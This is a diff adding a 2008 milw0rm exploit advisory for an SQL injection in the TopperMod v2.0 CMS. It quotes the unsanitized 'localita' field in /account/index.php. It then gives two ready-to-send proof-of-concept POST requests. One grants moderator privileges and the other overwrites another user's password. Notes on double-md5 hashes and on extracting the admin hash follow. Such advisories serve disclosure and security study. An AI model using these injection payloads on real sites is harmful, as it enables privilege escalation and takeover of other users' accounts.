@@ -1,0 +1,68 @@
+# Author:	__GiReX__
+# mySite:	girex.altervista.org
+
+# CMS: 		TopperMod v2.0
+# Site:		rtcw.ch/mio/index.php
+
+# Bug: 		SQL Injection
+
+# Type:	        1 - Priviledge Escalation (from user to mod)
+		2 - Remote user password change
+
+# File: 	/account/index.php
+# Var :		$localita
+
+# Need:		magic_quotes_gpc = Off
+		You must be logged in
+
+
+# Vuln Code: /account/index.php: 	
+
+	case "edituser_save":
+        ...
+
+
+	$localita=$_POST['localita']; 
+	...
+
+	if ($localita!="") { 
+		if (eregi("^[a-zA-Z0-9]",$localita)) {
+			$localita=substr(htmlentities(htmlspecialchars($localita), ENT_QUOTES),0,20);
+		}
+	}
+
+# And if our $_POST['localita'] does not begin with a char or a number?
+# Input not sanizated
+	
+	...
+	$res=dbquery("UPDATE ".PREFISSO."_utenti SET  email='$email', localita='$localita', sito='$sito', 
+		     tema='$tema_user', time_zone='$time_zone'  $pass  
+		     WHERE user_id='$user_id' "); 
+
+# Vulnerable query :D
+
+	
+
+# PoC 1:
+
+	POST  /[PATH]/mod.php?mod=account HTTP/1.1
+	Host: [TARGET]
+	...headers...
+
+	email=someone@somewhere.dot&localita=@', permessi='1&go=edituser_save&user_id=[YOUR_USER_ID]
+
+# PoC 2:
+
+	POST  /[PATH]/mod.php?mod=account HTTP/1.1
+	Host: [TARGET]
+	...headers...
+
+	email=someone@somewhere.dot&localita=@', password='[PASSWORD]&go=edituser_save&user_id=[VICTIM_USER_ID]
+
+
+
+# Note: [PASSWORD] must be the md5 of the md5 of the wanted password, you must forget in the content the end quote
+# We can also try to get admin hash trought sql subqueries but the password is crypted into md5 2 times
+# and Admins don't use cookies in this CMS...
+
+# milw0rm.com [2008-03-25]
